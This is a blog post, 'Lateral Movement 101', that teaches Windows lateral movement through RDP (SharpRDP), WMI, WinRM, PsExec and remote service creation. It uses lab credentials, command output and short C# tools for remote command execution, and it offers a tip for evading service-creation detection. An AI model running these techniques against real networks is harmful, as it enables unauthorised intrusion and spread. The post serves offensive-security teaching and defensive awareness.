@@ -1,0 +1,219 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Lateral Movement 101 - Offensive Defence</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.82.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://offensivedefence.co.uk/css/main.min.f90f5edd436ec7b74ad05479a05705770306911f721193e7845948fb07fe1335.css" />
+    <script src="https://kit.fontawesome.com/89e1a73a2b.js" crossorigin="anonymous"></script>
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Lateral Movement 101"/>
+<meta name="twitter:description" content="This post was requested by a Patron and will provide a crash course in lateral movement techniques on Windows using both native utilities and custom C# tooling.
+The most common lateral movement techniques are performed via legitimate management channels including Remote Desktop (RDP), Windows Remote Management (WinRM) and Windows Management Instrumentation (WMI). Platforms such as Windows Server Update Services (WSUS) and System Center Configuration Manager (SCCM) can also be abused."/>
+
+    <meta property="og:title" content="Lateral Movement 101" />
+<meta property="og:description" content="This post was requested by a Patron and will provide a crash course in lateral movement techniques on Windows using both native utilities and custom C# tooling.
+The most common lateral movement techniques are performed via legitimate management channels including Remote Desktop (RDP), Windows Remote Management (WinRM) and Windows Management Instrumentation (WMI). Platforms such as Windows Server Update Services (WSUS) and System Center Configuration Manager (SCCM) can also be abused." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://offensivedefence.co.uk/posts/lateral-movement-101/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-10-12T09:25:13&#43;01:00" />
+<meta property="article:modified_time" content="2021-10-12T09:25:13&#43;01:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://offensivedefence.co.uk"><img class="app-header-avatar" src="/avatar.png" alt="John Doe" /></a>
+      <h1>Offensive Defence</h1>
+      <p>&#34;The hand which strikes also blocks.&#34;</p>
+
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Lateral Movement 101</h1>
+      <div class="post-meta">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link">
+  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+</svg>
+              <a class="tag" href="https://offensivedefence.co.uk/authors/rastamouse/">Rasta Mouse</a>
+        
+      
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Oct 12, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          5 min read
+        </div></div>
+    </header>
+    <div class="post-content">
+      <p>This post was requested by a <a href="https://www.patreon.com/_RastaMouse">Patron</a> and will provide a crash course in lateral movement techniques on Windows using both native utilities and custom C# tooling.</p>
+<p>The most common lateral movement techniques are performed via legitimate management channels including Remote Desktop (RDP), Windows Remote Management (WinRM) and Windows Management Instrumentation (WMI).  Platforms such as Windows Server Update Services (WSUS) and System Center Configuration Manager (SCCM) can also be abused.</p>
+<p>These management protocols are effective because they provide legitimate remote access by design, and their use is not inherently mallicious or anomalous.  All an attacker need obtain is a set of privileged credentials or code execution in a privileged context.</p>
+<h2 id="remote-desktop">Remote Desktop</h2>
+<p>I think everyone has probably used RDP before.  It allows you to get a full GUI experience of a remote machine as if you were sat at it, optionally supporting clipboard sharing and remote drive mapping.  Attackers often operate via CLI driven tooling (e.g. Metasploit) and sometimes over high-latency connections.  For that reason, interacting with a remote target via a GUI is not always feasible (or enjoyable) which leads to a general preference for CLI attack tools.</p>
+<p><a href="https://github.com/0xthirteen/SharpRDP">SharpRDP</a> utilises the terminal services library to provide GUI-less authentication and interaction (by sending virtual keystrokes into the &ldquo;Run&rdquo; (Win+R) dialogue).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PS C:\&gt; Test-NetConnection -ComputerName dc -Port 3389
+
+ComputerName     : dc
+RemoteAddress    : 10.10.120.1
+RemotePort       : 3389
+InterfaceAlias   : Ethernet
+SourceAddress    : 10.10.120.101
+TcpTestSucceeded : True
+
+PS C:\&gt; .\SharpRDP.exe computername=dc command=calc username=LAB\Administrator password=Passw0rd!
+[+] Connected to          :  dc.lab.local
+[+] Execution priv type   :  non-elevated
+[+] Executing calc
+[+] Disconnecting from    :  dc.lab.local
+[+] Connection closed     :  dc.lab.local
+</code></pre></div><p><br /></p>
+<h2 id="windows-management-instrumentation">Windows Management Instrumentation</h2>
+<p>WMI is Microsoft&rsquo;s implementation of Web-Based Enterprise Management (WBEM), which is an industry standard for accessing management information of local or remote computers.  Applications that leverage WMI can get data or perform operations on said computers.</p>
+<p>Windows comes with a native <code>wmic</code> utility that can be used to execute commands on a target.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\&gt;wmic /NODE:dc.lab.local /USER:Administrator /PASSWORD:Passw0rd! process call create calc
+Executing (Win32_Process)-&gt;Create()
+Method execution successful.
+Out Parameters:
+instance of __PARAMETERS
+{
+        ProcessId = 6548;
+        ReturnValue = 0;
+};
+</code></pre></div><p>C# has a namespace called <code>System.Management</code> which can be used to perform the same.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
+{
+    <span style="color:#66d9ef">var</span> target = args[<span style="color:#ae81ff">0</span>];
+    <span style="color:#66d9ef">var</span> username = args[<span style="color:#ae81ff">1</span>];
+    <span style="color:#66d9ef">var</span> password = args[<span style="color:#ae81ff">2</span>];
+    <span style="color:#66d9ef">var</span> command = args[<span style="color:#ae81ff">3</span>];
+
+    <span style="color:#66d9ef">var</span> conn = <span style="color:#66d9ef">new</span> ConnectionOptions
+    {
+        Username = username,
+        Password = password
+    };
+
+    <span style="color:#66d9ef">var</span> scope = <span style="color:#66d9ef">new</span> ManagementScope(<span style="color:#e6db74">$@&#34;\\{target}\root\cimv2&#34;</span>, conn);
+    scope.Connect();
+            
+    <span style="color:#66d9ef">var</span> mClass = <span style="color:#66d9ef">new</span> ManagementClass(scope, <span style="color:#66d9ef">new</span> ManagementPath(<span style="color:#e6db74">&#34;Win32_Process&#34;</span>), <span style="color:#66d9ef">new</span> ObjectGetOptions());
+    <span style="color:#66d9ef">var</span> parameters = mClass.GetMethodParameters(<span style="color:#e6db74">&#34;Create&#34;</span>);
+    parameters[<span style="color:#e6db74">&#34;CommandLine&#34;</span>] = command;
+
+    <span style="color:#66d9ef">var</span> result = mClass.InvokeMethod(<span style="color:#e6db74">&#34;Create&#34;</span>, parameters, <span style="color:#66d9ef">null</span>);
+
+    Console.WriteLine(<span style="color:#e6db74">&#34;Return Value: {0}&#34;</span>, result[<span style="color:#e6db74">&#34;ReturnValue&#34;</span>]);
+    Console.WriteLine(<span style="color:#e6db74">&#34;Process ID  : {0}&#34;</span>, result[<span style="color:#e6db74">&#34;ProcessID&#34;</span>]);
+    }
+}
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\&gt;WmiDemo.exe dc.lab.local Administrator Passw0rd! calc
+Return Value: 0
+Process ID  : 6304
+</code></pre></div><p><br /></p>
+<h2 id="windows-remote-management">Windows Remote Management</h2>
+<p>PowerShell can be used to interact with a host via WinRM.  <code>Enter-PSSession</code> creates a PowerShell session on the target and gives you an interactive command prompt.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\&gt; $username = <span style="color:#e6db74">&#34;LAB\Administrator&#34;</span>
+PS C:\&gt; $password = ConvertTo-SecureString <span style="color:#e6db74">&#34;Passw0rd!&#34;</span> -AsPlainText -Force
+PS C:\&gt; $cred = New-Object System.Management.Automation.PSCredential($username, $password)
+PS C:\&gt; Enter-PSSession -ComputerName dc.lab.local -Credential $cred
+<span style="color:#66d9ef">[dc.lab.local]</span><span style="color:#960050;background-color:#1e0010">:</span> PS C:\Users\Administrator\Documents&gt; hostname
+dc
+<span style="color:#66d9ef">[dc.lab.local]</span><span style="color:#960050;background-color:#1e0010">:</span> PS C:\Users\Administrator\Documents&gt; whoami
+lab\administrator
+</code></pre></div><p>If you don&rsquo;t have an interactive prompt, <code>Invoke-Command</code> with <code>-ScriptBlock</code> can be used instead.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\&gt; Invoke-Command -ComputerName dc.lab.local -Credential $cred -ScriptBlock { hostname; whoami }
+dc
+lab\administrator
+</code></pre></div><p>C# tooling requires a reference to <code>System.Management.Automation.dll</code> which is available from the PowerShell SDK.  Or if you&rsquo;re lazy like me, grab a copy from Lee Christenden&rsquo;s <a href="https://github.com/leechristensen/UnmanagedPowerShell/blob/master/PowerShellRunner/System.Management.Automation.dll">UnmanagedPowerShell</a> project.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
+{
+    <span style="color:#66d9ef">var</span> target = args[<span style="color:#ae81ff">0</span>];
+    <span style="color:#66d9ef">var</span> username = args[<span style="color:#ae81ff">1</span>];
+    <span style="color:#66d9ef">var</span> password = args[<span style="color:#ae81ff">2</span>];
+    <span style="color:#66d9ef">var</span> command = args[<span style="color:#ae81ff">3</span>];
+
+    <span style="color:#66d9ef">var</span> securePass = <span style="color:#66d9ef">new</span> SecureString();
+
+    <span style="color:#66d9ef">foreach</span> (<span style="color:#66d9ef">var</span> c <span style="color:#66d9ef">in</span> password.ToCharArray())
+        securePass.AppendChar(c);
+
+    <span style="color:#66d9ef">var</span> credential = <span style="color:#66d9ef">new</span> PSCredential(username, securePass);
+    <span style="color:#66d9ef">var</span> uri = <span style="color:#66d9ef">new</span> Uri(<span style="color:#e6db74">$&#34;http://{target}:5985/WSMAN&#34;</span>);
+    <span style="color:#66d9ef">var</span> conn = <span style="color:#66d9ef">new</span> WSManConnectionInfo(uri, <span style="color:#66d9ef">string</span>.Empty, credential);
+
+    <span style="color:#66d9ef">using</span> var runspace = RunspaceFactory.CreateRunspace(conn);
+    runspace.Open();
+
+    <span style="color:#66d9ef">using</span> var powershell = PowerShell.Create();
+    powershell.Runspace = runspace;
+    powershell.AddScript(command);
+    powershell.AddCommand(<span style="color:#e6db74">&#34;Out-String&#34;</span>);
+
+    <span style="color:#66d9ef">var</span> result = powershell.Invoke();
+    <span style="color:#66d9ef">var</span> output = <span style="color:#66d9ef">string</span>.Join(Environment.NewLine, result.Select(r =&gt; r.ToString()).ToArray());
+            
+    Console.WriteLine(output);
+}
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\&gt;WinRMDemo.exe dc.lab.local LAB\Administrator Passw0rd! &#34;hostname; whoami&#34;
+dc
+lab\administrator
+</code></pre></div><p><br /></p>
+<h2 id="psexec">PsExec</h2>
+<p>PsExec is the name of a tool from <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">Sysinternals</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\&gt;PsExec64.exe \\dc.lab.local -u LAB\Administrator -p Passw0rd! -i cmd
+
+PsExec v2.34 - Execute processes remotely
+Copyright (C) 2001-2021 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Microsoft Windows [Version 10.0.20348.1]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;hostname &amp;&amp; whoami
+dc
+rto2\administrator
+</code></pre></div><p>This works by copying <code>PSEXESVC.exe</code> to the target, then creating a new service to execute it.  This binary in turn spawns the specified process (cmd in this case), attaches to its standard in/out and sends data back and forth over named pipes.  To clean up, the service is then removed and <code>PSEXESVC.exe</code> deleted.</p>
+<p>Interacting with the SCM is easy to replicate using the native <code>sc.exe</code> utility or in code.  The backend API <code>OpenSCManager</code> does not accept credentials, so all calls must occur within an authenticated session.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\&gt;runas /netonly /user:LAB\Administrator cmd.exe
+Enter the password for LAB\Administrator:
+Attempting to start cmd.exe as user &#34;LAB\Administrator&#34; ...
+
+C:\Windows\system32&gt;sc \\dc.lab.local create TestService binPath= &#34;C:\Windows\System32\calc.exe&#34;
+[SC] CreateService SUCCESS
+
+C:\Windows\system32&gt;sc \\dc.lab.local start TestService
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+
+C:\Windows\system32&gt;sc \\dc.lab.local delete TestService
+[SC] DeleteService SUCCESS
+</code></pre></div><p>Even though <code>start</code> threw an error, the command was executed and calc is running as SYSTEM.  Service binaries should technically be different from regular binaries, as they contain means of communicating directly with the SCM for status purposes.</p>
+<p>Instead of creating a service (which is often used as an IOC), we can modify an existing one instead.  Connect to the SCM of a remote machine and enumerate services to find those with a startup type of Manual.  Change its <code>binPath</code> to whatever you want to exectute, start the service and then change the path back.</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
